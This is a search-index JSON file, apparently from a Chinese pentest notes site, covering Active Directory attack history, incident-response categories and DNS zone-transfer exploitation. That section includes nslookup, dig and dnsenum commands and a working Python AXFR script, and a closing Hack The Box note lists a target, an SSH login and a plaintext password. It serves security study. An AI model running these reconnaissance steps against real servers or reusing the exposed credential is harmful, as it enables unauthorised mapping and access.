\u5e10\u6237\u7684\u4e00\u90e8\u5206\u3002DCSync \u653b\u51fb\u6700\u521d\u7531 Benjamin Delpy \u548c Vincent Le Toux \u4f5c\u4e3amimikatz\u5de5\u5177\u7684\u4e00\u90e8\u5206\u53d1\u5e03\u3002\u6b64\u540e\uff0c\u5b83\u5df2\u5305\u542b\u5728\u5176\u4ed6\u5de5\u5177\u4e2d\u3002\u5f15\u5165\u4e86 CrackMapExec \u7684\u7b2c\u4e00\u4e2a\u7a33\u5b9a\u7248\u672c\uff08\uff08v1.0.0\uff09\u00a0\u3002Sean Metcalf \u5728\u7f8e\u56fd\u9ed1\u5e3d\u5927\u4f1a\u4e0a\u53d1\u8868\u4e86\u5173\u4e8e Kerberos \u65e0\u7ea6\u675f\u59d4\u6d3e\u7684\u5371\u9669\u7684\u6f14\u8bb2\uff0c\u5e76\u53d1\u5e03\u4e86\u4e00\u7bc7\u5173\u4e8e\u8be5\u4e3b\u9898\u7684\u4f18\u79c0\u535a\u5ba2\u6587\u7ae0\u3002Impacket\u5de5\u5177\u5305\u4e5f\u4e8e 2015 \u5e74\u53d1\u5e03\u3002\u8fd9\u662f Python \u5de5\u5177\u7684\u96c6\u5408\uff0c\u5176\u4e2d\u8bb8\u591a\u53ef\u7528\u4e8e\u6267\u884c Active Directory \u653b\u51fb\u3002\u622a\u81f3 2022 \u5e74 1 \u6708\uff0c\u5b83\u4ecd\u5728\u79ef\u6781\u7ef4\u62a4\u4e2d\uff0c\u5e76\u4e14\u662f\u5927\u591a\u6570\u6e17\u900f\u6d4b\u8bd5\u4eba\u5458\u5de5\u5177\u5305\u7684\u5173\u952e\u90e8\u5206\u3002</p> <p>2014 Veil-PowerView \u9996\u6b21\u53d1\u5e03\u3002\u8be5\u9879\u76ee\u540e\u6765\u6210\u4e3aPowerSploit\u6846\u67b6\u7684\u4e00\u90e8\u5206\uff0c\u4f5c\u4e3a\uff08\u4e0d\u518d\u53d7\u652f\u6301\u7684\uff09PowerView.ps1\u00a0AD \u4fa6\u5bdf\u5de5\u5177\u3002Kerberoasting \u653b\u51fb\u6700\u521d\u662f\u5728 2014 \u5e74 SANS Hackfest\u7684Tim Medin\u4f1a\u8bae\u4e0a\u63d0\u51fa\u7684\u3002</p> <p>2013  Responder\u5de5\u5177\u7531Laurent Gaffie \u53d1\u5e03\u3002Responder \u662f\u4e00\u79cd\u7528\u4e8e\u5728 Active Directory \u7f51\u7edc\u4e0a\u6bd2\u5316 LLMNR\u3001NBT-NS \u548c MDNS \u7684\u5de5\u5177\u3002\u5b83\u53ef\u7528\u4e8e\u83b7\u53d6\u5bc6\u7801\u54c8\u5e0c\u5e76\u6267\u884c SMB \u4e2d\u7ee7\u653b\u51fb\uff08\u4e0e\u5176\u4ed6\u5de5\u5177\u7ed3\u5408\u4f7f\u7528\u65f6\uff09\u4ee5\u5728 AD \u73af\u5883\u4e2d\u6a2a\u5411\u548c\u7eb5\u5411\u79fb\u52a8\u3002\u591a\u5e74\u6765\uff0c\u5b83\u5df2\u7ecf\u6709\u4e86\u957f\u8db3\u7684\u53d1\u5c55\uff0c\u622a\u81f3 2022 \u5e74 1 \u6708\uff0c\u5b83\u4ecd\u7136\u53d7\u5230\u79ef\u6781\u652f\u6301\uff08\u6dfb\u52a0\u4e86\u65b0\u529f\u80fd\uff09\u3002</p>"},{"location":"%E5%9F%BA%E7%A1%80/Active%20Directory%20%E7%AE%80%E4%BB%8B/#_2","title":"\u6d3b\u52a8\u76ee\u5f55\u7ed3\u6784","text":"<p>Active Directory \u7f3a\u9677\u548c\u9519\u8bef\u914d\u7f6e\u901a\u5e38\u53ef\u7528\u4e8e\u6253\u70b9\u3001\u5728\u7f51\u7edc\u4e2d\u7eb5\u6a2a\u79fb\u52a8\u3001\u672a\u6388\u6743\u8bbf\u95ee\u53d7\u4fdd\u62a4\u7684\u8d44\u6e90\uff0c\u4f8b\u5982\u6570\u636e\u5e93\u3001\u6587\u4ef6\u5171\u4eab\u3001\u6e90\u4ee3\u7801\u7b49\u3002 \u57fa\u672cAD\u7528\u6237\u8d26\u6237 \u57df\u8ba1\u7b97\u673a \u57df\u7528\u6237 \u57df\u7ec4\u4fe1\u606f \u7ec4\u7ec7\u5355\u4f4d(Organizational Units) \u9ed8\u8ba4\u57df\u7b56\u7565 \u529f\u80fd\u57df\u7ea7\u522b(Functional Domain Levels) \u5bc6\u7801\u7b56\u7565 \u7ec4\u7b56\u7565\u5bf9\u8c61(GPO) \u57df\u4fe1\u4efb \u8bbf\u95ee\u63a7\u5236\u5217\u8868(ACL)</p>"},{"location":"%E5%9F%BA%E7%A1%80/DNS%E5%8C%BA%E5%9F%9F%E4%BC%A0%E9%80%81%28DNS%20Zone%20Transfer%29/","title":"DNS\u533a\u57df\u4f20\u9001(DNS Zone Transfer)","text":""},{"location":"%E5%9F%BA%E7%A1%80/DNS%E5%8C%BA%E5%9F%9F%E4%BC%A0%E9%80%81%28DNS%20Zone%20Transfer%29/#_1","title":"\u6982\u8ff0","text":"<p>\u5229\u7528\u533a\u57df\u4f20\u9001\u6709\u6548\u6536\u96c6\u5b50\u57df\u540d\u4fe1\u606f</p> <p>\u533a\u57df\u4f20\u9001\u64cd\u4f5c\u6307\u7684\u662f\u4e00\u53f0\u540e\u5907\u670d\u52a1\u5668\u4f7f\u7528\u6765\u81ea\u4e3b\u670d\u52a1\u5668\u7684\u6570\u636e\u5237\u65b0\u81ea\u5df1\u7684 zone \u6570\u636e\u5e93\u3002\u8fd9\u4e3a\u8fd0\u884c\u4e2d\u7684 DNS \u670d\u52a1\u63d0\u4f9b\u4e86\u4e00\u5b9a\u7684\u5197\u4f59\u5ea6,\u5176\u76ee\u7684\u662f\u4e3a\u4e86\u9632\u6b62\u4e3b\u57df\u540d\u670d\u52a1\u5668\u56e0\u610f\u5916\u6545\u969c\u53d8\u5f97\u4e0d\u53ef\u7528\u65f6\u5f71\u54cd\u5230\u5168\u5c40\u3002</p> <p>\u4e00\u822c\u6765\u8bf4,DNS\u533a\u57df\u4f20\u9001\u64cd\u4f5c\u53ea\u5728\u7f51\u7edc\u91cc\u771f\u7684\u6709\u540e\u5907\u57df\u540d DNS \u670d\u52a1\u5668\u65f6\u624d\u6709\u5fc5\u8981\u6267\u884c,\u4f46\u8bb8\u591a DNS \u670d\u52a1\u5668\u5374\u88ab\u9519\u8bef\u5730\u914d\u7f6e\u6210\u53ea\u8981\u6709\u4eba\u53d1\u51fa\u8bf7\u6c42,\u5c31\u4f1a\u5411\u5bf9\u65b9\u63d0\u4f9b\u4e00\u4e2a zone \u6570\u636e\u5e93\u7684\u62f7\u8d1d\u3002\u5982\u679c\u6240\u63d0\u4f9b\u7684\u4fe1\u606f\u53ea\u662f\u4e0e\u8fde\u5230\u56e0\u7279\u7f51\u4e0a\u4e14\u5177\u5907\u6709\u6548\u4e3b\u673a\u540d\u7684\u7cfb\u7edf\u76f8\u5173,\u90a3\u4e48\u8fd9\u79cd\u9519\u8bef\u914d\u7f6e\u4e0d\u4e00\u5b9a\u662f\u574f\u4e8b,\u5c3d\u7ba1\u8fd9\u4f7f\u5f97\u653b\u51fb\u8005\u53d1\u73b0\u6f5c\u5728\u76ee\u6807\u8981\u5bb9\u6613\u5f97\u591a\u3002 f \u771f\u6b63\u7684\u95ee\u9898\u53d1\u751f\u5728\u4e00\u4e2a\u5355\u4f4d\u6ca1\u6709\u4f7f\u7528\u516c\u7528/\u79c1\u7528 DNS \u673a\u5236\u6765\u5206\u5272\u5916\u90e8\u516c\u7528 DNS \u4fe1\u606f\u548c\u5185\u90e8\u79c1\u7528 DNS \u4fe1\u606f\u7684\u65f6\u5019,\u6b64\u65f6\u5185\u90e8\u4e3b\u673a\u540d\u548c IP \u5730\u5740\u90fd\u66b4\u9732\u7ed9\u4e86\u653b\u51fb\u8005\u3002\u628a\u5185\u90e8 IP \u5730\u5740\u4fe1\u606f\u63d0\u4f9b\u7ed9\u56e0\u7279\u7f51\u4e0a\u4e0d\u53d7\u4fe1\u4efb\u7684\u7528\u6237,\u5c31\u50cf\u662f\u628a\u4e00\u4e2a\u5355\u4f4d\u7684\u5185\u90e8\u7f51\u7edc\u5b8c\u6574\u84dd\u56fe\u6216\u5bfc\u822a\u56fe\u5949\u9001\u7ed9\u4e86\u522b\u4eba\u3002\u5bf9\u7cfb\u7edf\u7ba1\u7406\u5458\u6765\u8bf4,\u5141\u8bb8\u4e0d\u53d7\u4fe1\u4efb\u7684\u56e0\u7279\u7f51\u7528\u6237\u6267\u884c DNS \u533a\u57df\u4f20\u9001(<code>zone transfer</code>)\u64cd\u4f5c\u662f\u540e\u679c\u6700\u4e3a\u4e25\u91cd\u7684\u9519\u8bef\u914d\u7f6e\u4e4b\u4e00\u3002</p>"},{"location":"%E5%9F%BA%E7%A1%80/DNS%E5%8C%BA%E5%9F%9F%E4%BC%A0%E9%80%81%28DNS%20Zone%20Transfer%29/#_2","title":"\u5229\u7528","text":"<p>Nslookup 1.  \u5148\u8bbe\u7f6e\u67e5\u627e\u7c7b\u578b\u4e3aNS\uff0c\u67e5\u627e\u51fa\u5bf9\u5e94\u4e3b\u673a\u57df\u7684\u57df\u540d\u670d\u52a1\u5668\u3002\uff08\u6216\u76f4\u63a5\u952e\u5165nslookup\u8fdb\u5165\u4ea4\u4e92\u6a21\u5f0f\uff0c\u518d\u901a\u8fc7<code>set type=ns</code>\u8fdb\u884c\u8bbe\u7f6e\uff09</p> <pre><code>`C:\\&gt;nslookup -qa=ns test.com`\n\n\u4f1a\u8fd4\u56de\u7c7b\u4f3c\u7ed3\u679c\uff1a\n\n```\n    Server:  bogon\n    Address:  172.16.162.2\n\n    Non-authoritative answer:\n    test.com        nameserver = ns66.worldnic.com\n    test.com        nameserver = ns65.worldnic.com\n```\n</code></pre> <ol> <li> <p>\u4f7f\u7528nslookup\u547d\u4ee4\u8fdb\u5165\u4ea4\u4e92\u6a21\u5f0f\uff0c\u66f4\u6539\u9ed8\u8ba4\u670d\u52a1\u5668\u4e3a\u521a\u624d\u67e5\u8be2\u7684\u57df\u540d\u670d\u52a1\u5668</p> <p><code>&gt; server=ns66.worldnic.com</code></p> </li> <li> <p>\u5217\u51fa\u670d\u52a1\u5668\u4e0a\u6240\u6709\u7684DNS\u8bb0\u5f55</p> <p><code>&gt; ls -d test.com</code></p> </li> <li> <p>nslookup\u547d\u4ee4\u53c2\u8003\uff1a</p> <ul> <li>\u300anslookup\u901a\u5f80DNS\u7684\u6865\u6881\u300b-linux\u547d\u4ee4\u4e94\u5206\u949f\u7cfb\u5217\u4e4b\u4e09\u5341\u4e09</li> <li>nslookup\u8fdb\u5165\u4ea4\u4e92\u6a21\u5f0f\u540e\u67e5\u770b\u5e2e\u52a9\uff1a<code>&gt;help</code></li> </ul> </li> </ol>"},{"location":"%E5%9F%BA%E7%A1%80/DNS%E5%8C%BA%E5%9F%9F%E4%BC%A0%E9%80%81%28DNS%20Zone%20Transfer%29/#dig","title":"Dig","text":"<ul> <li> <p>\u4f7f\u7528<code>dig</code>\u547d\u4ee4\u8fdb\u884c\u5168\u91cf\u4f20\u8f93AXFR\uff08\u4ece\u57df\u540d\u670d\u52a1\u5668\u4ece\u4e3b\u57df\u540d\u670d\u52a1\u5668\u4e0a\u8bf7\u6c42zone\u6587\u4ef6\uff09</p> <p><code>dig @dnsserver name querytype   dig @192.168.5.6 test.com axfr</code></p> </li> <li> <p>\u4f7f\u7528<code>dnsenum</code>\u83b7\u53d6\u6d4b\u8bd5\u5bf9\u8c61\u5168\u90e8\u7684 DNS \u89e3\u6790\u8bb0\u5f55\u4fe1\u606f</p> <p><code>./dnsenum.pl \u2013enum test.com</code></p> </li> <li> <p>\u4f7f\u7528<code>dnswalk</code>\u83b7\u53d6\u6d4b\u8bd5\u5bf9\u8c61\u5168\u90e8\u7684 DNS \u89e3\u6790\u8bb0\u5f55\u4fe1\u606f\uff0c\u6ce8\u610f\u57df\u540d\u540e\u6709\u4e00\u4e2a\u70b9</p> <p><code>./dnswalk test.com.</code></p> </li> <li> <p>\u76f8\u5173\u547d\u4ee4\u53c2\u8003\uff1a</p> <ul> <li>\u300a\u5b89\u5168\u53c2\u8003\u300b\u7b2c\u4e00\u671f</li> <li>DNS\u57df\u4f20\u9001\u4fe1\u606f\u6cc4\u9732</li> <li>\u300adig\u6316\u51faDNS\u7684\u79d8\u5bc6\u300b-linux\u547d\u4ee4\u4e94\u5206\u949f\u7cfb\u5217\u4e4b\u4e09\u5341\u56db</li> </ul> </li> </ul>"},{"location":"%E5%9F%BA%E7%A1%80/DNS%E5%8C%BA%E5%9F%9F%E4%BC%A0%E9%80%81%28DNS%20Zone%20Transfer%29/#python","title":"Python","text":"<pre><code>#!/usr/bin/env python\n### Zonepuller\n## Attempts to get a domain transfer from the nameservers for the given domain\n## Requires dnspython http://www.dnspython.org/    import sys\nimport socket\nimport optparse\ntry:\n    from dns import resolver, query, exception\nexcept ImportError:\n    print \"This script requires dnspython\"\n    print \"http://www.dnspython.org/\"\n    sys.exit(1)    \n\nclass Transferrer(object):\n    def __init__(self, domain):\n        self.domain = domain\n        ## build list of nameservers\n        nss = resolver.query(domain, 'NS')\n        self.nameservers = [ str(ns) for ns in nss ]    \n    def transfer(self):\n        for ns in self.nameservers:\n            print &gt;&gt; sys.stderr, \"Querying %s\" % (ns,)\n            print &gt;&gt; sys.stderr, \"-\" * 50\n            z = self.query(ns)\n            print z\n            print &gt;&gt; sys.stderr, \"%s\\n\" % (\"-\" * 50,)    \n    def query(self, ns):\n        nsaddr = self.resolve_a(ns)\n        try:\n            z = self.pull_zone(nsaddr)\n        except (exception.FormError, socket.error, EOFError):\n            print &gt;&gt; sys.stderr, \"AXFR failed\\n\"\n            return None\n        else:\n            return z    \n    def resolve_a(self, name):\n        \"\"\"Pulls down an A record for a name\"\"\"\n        nsres = resolver.query(name, 'A')\n        return str(nsres[0])    \n    def pull_zone(self, nameserver):\n        \"\"\"Sends the domain transfer request\"\"\"\n        q = query.xfr(nameserver, self.domain, relativize=False, timeout=2)\n        zone = \"\"   ## janky, but this library returns\n        for m in q: ## an empty generator on timeout\n            zone += str(m)\n        if not zone:\n            raise EOFError\n        return zone    \ndef main():\n    parser = optparse.OptionParser(usage=\"%prog &lt;domain&gt;\", version=\"%prog 0.1\")\n    options, args = parser.parse_args()\n    if not args:\n        parser.error(\"Must include at least one domain to transfer\")        for dom in args:\n        t = Transferrer(dom)\n        t.transfer()\n</code></pre>"},{"location":"%E5%9F%BA%E7%A1%80/DNS%E5%8C%BA%E5%9F%9F%E4%BC%A0%E9%80%81%28DNS%20Zone%20Transfer%29/#_3","title":"\u5206\u6790\uff1a","text":"<ul> <li>\u7a0b\u5e8f\u5148\u5c1d\u8bd5\u5bfc\u5165dns\uff0c\u6ca1\u6709\u5b89\u88c5dnspython\u5219\u9000\u51fa</li> <li>\u5b9a\u4e49Transferrer()\u7c7b\u6765\u5b8c\u6210\u4e3b\u8981\u7684\u57df\u4f20\u9001\u68c0\u6d4b\uff0c\u5148\u4f7f\u7528<code>resolver.query(domain, 'NS')</code>\u65b9\u6cd5\u67e5\u8be2\u5bf9\u5e94\u57df\u540d\u7684NS\u8bb0\u5f55\uff0c\u5e76\u5c06\u5176\u4f5c\u4e3a\u57df\u540d\u670d\u52a1\u5668\u67e5\u8be2\u5176A\u8bb0\u5f55\uff0c\u6700\u540e\u4f7f\u7528<code>query.xfr(nameserver, self.domain, relativize=False, timeout=2)</code>\u5c1d\u8bd5\u8fdb\u884c\u57df\u4f20\u9001</li> <li>main()\u51fd\u6570\u4e3b\u8981\u5bf9\u547d\u4ee4\u884c\u4f20\u5165\u7684\u57df\u540d\u8fdb\u884c\u5355\u7ebf\u7a0b\u4e32\u884c\u68c0\u6d4b\u662f\u5426\u5b58\u5728DNS\u57df\u4f20\u9001</li> </ul>"},{"location":"%E5%9F%BA%E7%A1%80/DNS%E5%8C%BA%E5%9F%9F%E4%BC%A0%E9%80%81%28DNS%20Zone%20Transfer%29/#tips","title":"Tips\uff1a","text":"<ul> <li><code>print &gt;&gt; sys.stderr, \"Message\"</code>\u53ef\u5c06\u4fe1\u606f\u91cd\u5b9a\u5411\u8f93\u51fa\u5230\u6807\u51c6\u9519\u8bef\u8f93\u51fa\u5f53\u4e2d</li> <li><code>parser.error(\"Message\")</code>\u53ef\u7528\u4e8e\u9009\u9879\u89e3\u6790\u9519\u8bef\u63d0\u793a</li> </ul>"},{"location":"%E5%9F%BA%E7%A1%80/DNS%E5%8C%BA%E5%9F%9F%E4%BC%A0%E9%80%81%28DNS%20Zone%20Transfer%29/#0x04","title":"0x04 \u9632\u5fa1\u65b9\u6cd5","text":"<p>\u5728\u76f8\u5e94\u7684zone\u3001options\u4e2d\u6dfb\u52a0allow-transfer\u9650\u5236\uff0c\u5177\u4f53\u89c1DNS \u57df\u4f20\u9001\u6f0f\u6d1e\u3002\u8fd9\u91cc\u8fd8\u5b58\u5728\u7684\u95ee\u9898\u662f\uff1a\u672a\u5bf9DNS\u670d\u52a1\u548cDNS\u670d\u52a1\u5668\u6df1\u5165\u4e86\u89e3\uff0c\u653b\u51fb\u4e5f\u6ca1\u6709\u91cd\u73b0\uff0c\u8fd8\u6709\u5f85\u6df1\u5165\u5b66\u4e60\uff0c\u800c\u4e14DNS\u7684\u95ee\u9898\u4e5f\u4e0d\u6b62\u8fd9\u4e9b\uff0c\u63a8\u8350\u770b\u770b</p>"},{"location":"%E5%9F%BA%E7%A1%80/HTTP%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%28%E5%BE%85%E5%AE%8C%E6%88%90%29/","title":"HTTP\u76f8\u5173\u77e5\u8bc6(\u5f85\u5b8c\u6210)","text":""},{"location":"%E5%9F%BA%E7%A1%80/HTTP%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%28%E5%BE%85%E5%AE%8C%E6%88%90%29/#hypertext-transfer-protocol-http","title":"HyperText Transfer Protocol (HTTP)","text":""},{"location":"%E5%9F%BA%E7%A1%80/HTTP%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%28%E5%BE%85%E5%AE%8C%E6%88%90%29/#crud-api","title":"CRUD(\u589e\u5220\u6539\u67e5) API","text":"<p>\u4ecb\u7ecd Web \u5e94\u7528\u7a0b\u5e8f\u5982\u4f55\u5229\u7528 API \u6765\u5b9e\u73b0\u529f\u80fd\u3002</p>"},{"location":"%E5%9F%BA%E7%A1%80/HTTP%E7%9B%B8%E5%85%B3%E7%9F%A5%E8%AF%86%28%E5%BE%85%E5%AE%8C%E6%88%90%29/#apis","title":"APIs","text":"<p>API \u6709\u5f88\u591a\u79cd\u7c7b\u578b\u3002\u9700\u8981 API \u7528\u4e8e\u4e0e\u6570\u636e\u5e93\u4ea4\u4e92\uff0c\u8fd9\u6837\u6211\u4eec\u5c31\u53ef\u4ee5\u5728 API \u67e5\u8be2\u4e2d\u6307\u5b9a\u8bf7\u6c42\u7684\u8868\u548c\u8bf7\u6c42\u7684\u884c\uff0c\u7136\u540e\u4f7f\u7528 HTTP \u65b9\u6cd5\u6267\u884c\u6240\u9700\u7684\u64cd\u4f5c\u3002</p>"},{"location":"%E5%9F%BA%E7%A1%80/%E5%B8%B8%E8%A7%81%E8%8B%B1%E8%AF%AD/","title":"\u5e38\u89c1\u82f1\u8bed","text":"<p>Synopsis \u6982\u8981\uff0c\u7b80\u4ecb\uff0c\u8bf4\u660e\u4e66</p>"},{"location":"%E5%BA%94%E6%80%A5/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/","title":"\u5e94\u6025\u54cd\u5e94","text":""},{"location":"%E5%BA%94%E6%80%A5/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#_2","title":"\u5904\u7f6e\u6d41\u7a0b","text":""},{"location":"%E5%BA%94%E6%80%A5/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#_3","title":"\u4e8b\u4ef6\u53d1\u751f","text":"<p>\u8fd0\u7ef4\u76d1\u63a7\u4eba\u5458\u3001\u5ba2\u670d\u5ba1\u6838\u4eba\u5458\u7b49\u53d1\u73b0\u95ee\u9898\uff0c\u5411\u4e0a\u901a\u62a5\u3002</p>"},{"location":"%E5%BA%94%E6%80%A5/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#_4","title":"\u4e8b\u4ef6\u786e\u8ba4","text":"<p>\u6536\u96c6\u4e8b\u4ef6\u4fe1\u606f\u3001\u5206\u6790\u7f51\u7edc\u6d3b\u52a8\u76f8\u5173\u7a0b\u5e8f\uff0c\u65e5\u5fd7\u548c\u6570\u636e\uff0c\u5224\u65ad\u4e8b\u4ef6\u7684\u4e25\u91cd\u6027\uff0c\u8bc4\u4f30\u51fa\u95ee\u9898\u7684\u4e25\u91cd\u7b49\u7ea7\uff0c\u662f\u5426\u5411\u4e0a\u8fdb\u884c\u6c47\u62a5\u7b49\u3002</p>"},{"location":"%E5%BA%94%E6%80%A5/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#_5","title":"\u4e8b\u4ef6\u54cd\u5e94","text":"<p>\u5404\u90e8\u95e8\u901a\u529b\u5408\u4f5c\uff0c\u5904\u7406\u5b89\u5168\u95ee\u9898\uff0c\u5177\u4f53\u89e3\u51b3\u95ee\u9898\uff0c\u907f\u514d\u5b58\u5728\u6f0f\u6d1e\u672a\u4fee\u8865\u3001\u540e\u95e8\u672a\u6e05\u9664\u7b49\u6b8b\u7559\u95ee\u9898\u3002</p>"},{"location":"%E5%BA%94%E6%80%A5/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#_6","title":"\u4e8b\u4ef6\u5173\u95ed","text":"<p>\u5904\u7406\u5b8c\u4e8b\u4ef6\u4e4b\u540e\uff0c\u9700\u8981\u5173\u95ed\u4e8b\u4ef6\uff0c\u5e76\u5199\u51fa\u5b89\u5168\u5e94\u6025\u5904\u7406\u5206\u6790\u62a5\u544a\uff0c\u5b8c\u6210\u6574\u4e2a\u5e94\u6025\u8fc7\u7a0b\u3002</p>"},{"location":"%E5%BA%94%E6%80%A5/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/#_7","title":"\u4e8b\u4ef6\u5206\u7c7b","text":"<ul> <li> <p>\u75c5\u6bd2\u3001\u6728\u9a6c\u3001\u8815\u866b\u4e8b\u4ef6</p> </li> <li> <p>Web\u670d\u52a1\u5668\u5165\u4fb5\u4e8b\u4ef6</p> </li> <li> <p>\u7b2c\u4e09\u65b9\u670d\u52a1\u5165\u4fb5\u4e8b\u4ef6</p> </li> <li> <ul> <li>\u7cfb\u7edf\u5165\u4fb5\u4e8b\u4ef6</li> </ul> <p>\u5229\u7528Windows\u6f0f\u6d1e\u653b\u51fb\u64cd\u4f5c\u7cfb\u7edf</p> </li> <li> <ul> <li>\u7f51\u7edc\u653b\u51fb\u4e8b\u4ef6</li> </ul> <p>DDoS / ARP\u6b3a\u9a97 / DNS\u52ab\u6301\u7b49</p> </li> </ul> <p>\u7f51\u7edc\u653b\u51fb\u4e8b\u4ef6</p> <ul> <li>\u5b89\u5168\u626b\u63cf\u653b\u51fb\uff1a\u9ed1\u5ba2\u5229\u7528\u626b\u63cf\u5668\u5bf9\u76ee\u6807\u8fdb\u884c\u6f0f\u6d1e\u63a2\u6d4b\uff0c\u5e76\u5728\u53d1\u73b0\u6f0f\u6d1e\u540e\u8fdb\u4e00\u6b65\u5229\u7528\u6f0f\u6d1e\u8fdb\u884c\u653b\u51fb</li> <li>\u66b4\u529b\u7834\u89e3\u653b\u51fb\uff1a\u5bf9\u76ee\u6807\u7cfb\u7edf\u8d26\u53f7\u5bc6\u7801\u8fdb\u884c\u66b4\u529b\u7834\u89e3\uff0c\u83b7\u53d6\u540e\u53f0\u7ba1\u7406\u5458\u6743\u9650</li> <li>\u7cfb\u7edf\u6f0f\u6d1e\u653b\u51fb\uff1a\u5229\u7528\u64cd\u4f5c\u7cfb\u7edf\u3001\u5e94\u7528\u7cfb\u7edf\u4e2d\u5b58\u5728\u6f0f\u6d1e\u8fdb\u884c\u653b\u51fb</li> <li>Web\u6f0f\u6d1e\u653b\u51fb\uff1a\u901a\u8fc7SQL\u6ce8\u5165\u6f0f\u6d1e\u3001\u4e0a\u4f20\u6f0f\u6d1e\u3001XSS\u6f0f\u6d1e\u3001\u6388\u6743\u7ed5\u8fc7\u7b49\u5404\u79cdWeb\u6f0f\u6d1e\u8fdb\u884c\u653b\u51fb</li> <li>\u62d2\u7edd\u670d\u52a1\u653b\u51fb\uff1a\u901a\u8fc7\u5927\u6d41\u91cfDDoS\u6216\u8005CC\u653b\u51fb\u76ee\u6807\uff0c\u4f7f\u76ee\u6807\u670d\u52a1\u5668\u65e0\u6cd5\u63d0\u4f9b\u6b63\u5e38\u670d\u52a1</li> <li>\u5176\u4ed6\u7f51\u7edc\u653b\u51fb\u884c\u4e3a</li> </ul> <p>\u6076\u610f\u7a0b\u5e8f\u4e8b\u4ef6</p> <p>\u6076\u610f\u7a0b\u5e8f\u4e3b\u8981\u7c7b\u578b\u53ca\u5371\u5bb3\uff1a</p> <ul> <li>\u75c5\u6bd2\u3001\u8815\u866b\uff1a\u9020\u6210\u7cfb\u7edf\u7f13\u6162\uff0c\u6570\u636e\u635f\u574f\u3001\u8fd0\u884c\u5f02\u5e38</li> <li>\u8fdc\u63a7\u6728\u9a6c\uff1a \u4e3b\u673a\u88ab\u9ed1\u5ba2\u8fdc\u7a0b\u63a7\u5236</li> <li>\u50f5\u5c38\u7f51\u7edc\u7a0b\u5e8f\uff08\u8089\u9e21\u884c\u4e3a\uff09\uff1a\u4e3b\u673a\u5bf9\u5916\u53d1\u52a8DDoS\u653b\u51fb\u3001\u5bf9\u5916\u53d1\u8d77\u626b\u63cf\u653b\u51fb\u884c\u4e3a</li> <li>\u6316\u77ff\u7a0b\u5e8f\uff1a\u9020\u6210\u7cfb\u7edf\u8d44\u6e90\u5927\u91cf\u6d88\u8017</li> </ul> <p>Web\u6076\u610f\u4ee3\u7801</p> <p>\u7f51\u7ad9\u6076\u610f\u4ee3\u7801\u5e38\u89c1\u7c7b\u578b\u53ca\u5371\u5bb3\uff1a</p> <ul> <li>Webshell\u540e\u95e8\uff1a\u9ed1\u5ba2\u901a\u8fc7Webshell\u63a7\u5236\u4e3b\u673a</li> <li>\u7f51\u9875\u6302\u9a6c\uff1a\u9875\u9762\u88ab\u690d\u5165\u5f85\u75c5\u6bd2\u5185\u5bb9\uff0c\u5f71\u54cd\u8bbf\u95ee\u8005\u5b89\u5168</li> <li>\u7f51\u9875\u6697\u94fe\uff1a\u7f51\u7ad9\u88ab\u690d\u5165\u535a\u5f69\u3001\u8272\u60c5\u3001\u6e38\u620f\u7b49\u5e7f\u544a\u5185\u5bb9</li> </ul> <p>\u4fe1\u606f\u7834\u574f\u4e8b\u4ef6</p> <ul> <li>\u7cfb\u7edf\u914d\u7f6e\u906d\u7be1\u6539\uff1a\u7cfb\u7edf\u4e2d\u51fa\u73b0\u7684\u5f02\u5e38\u7684\u670d\u52a1\u3001\u8fdb\u7a0b\u3001\u542f\u52a8\u9879\u3001\u8d26\u53f7\u7b49\u7b49</li> <li>\u6570\u636e\u5e93\u5185\u5bb9\u7be1\u6539\uff1a\u4e1a\u52a1\u6570\u636e\u906d\u5230\u6076\u610f\u7be1\u6539\uff0c\u5f15\u8d77\u4e1a\u52a1\u5f02\u5e38\u548c\u635f\u5931</li> <li>\u7f51\u7ad9\u5185\u5bb9\u7be1\u6539\u4e8b\u4ef6\uff1a\u7f51\u7ad9\u9875\u9762\u5185\u5bb9\u88ab\u9ed1\u5ba2\u6076\u610f\u7be1\u6539</li> <li>\u4fe1\u606f\u6570\u636e\u6cc4\u9732\u4e8b\u4ef6\uff1a\u670d\u52a1\u5668\u6570\u636e\u3001\u4f1a\u5458\u8d26\u53f7\u906d\u5230\u7a83\u53d6\u5e76\u6cc4\u9732</li> </ul> <p>\u5176\u4ed6\u5b89\u5168\u4e8b\u4ef6</p> <ul> <li>\u8d26\u53f7\u88ab\u5f02\u5e38\u767b\u5f55\uff1a\u7cfb\u7edf\u8d26\u53f7\u5728\u5f02\u5730\u767b\u5f55\uff0c\u53ef\u80fd\u51fa\u73b0\u8d26\u53f7\u5bc6\u7801\u6cc4\u9732</li> <li>\u5f02\u5e38\u7f51\u7edc\u8fde\u63a5\uff1a\u670d\u52a1\u5668\u53d1\u8d77\u5bf9\u5916\u7684\u5f02\u5e38\u8bbf\u95ee\uff0c\u8fde\u63a5\u5230\u6728\u9a6c\u4e3b\u63a7\u7aef\u3001\u77ff\u6c60\u3001\u75c5\u6bd2\u670d\u52a1\u5668\u7b49\u884c\u4e3a</li> </ul>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Altered/","title":"Altered","text":"<p>Altered</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Altered/#_1","title":"\u57fa\u672c\u4fe1\u606f","text":"<p>export target=\"10.129.135.195\"</p> <p>ssh htb-ovuln@htb-we15mv8wps.htb-cloud.com</p> <p>5m8otuMK</p>"},{"location":"%E6%9C%AA%E5%BD%92%E6%A1%A3/Altered/#_2","title":"\u5165\u4fb5\u8def\u5f84","text":"<p>\u5bc6\u7801\u91cd\u7f6e\u529f\u80fd</p> <p>\u7ed5\u8fc7HTTP\u6807\u5934\u7684\u901f\u7387\u9650\u5236\u8fdb\u884c\u66b4\u529b\u7834\u89e3</p> <p>\u5229\u7528SQL\u6ce8\u5165\u653b\u51fb\u83b7\u53d6WebShell\uff08\u7acb\u8db3\u70b9\uff09</p> <p>\u5229\u7528Dirty Pipe 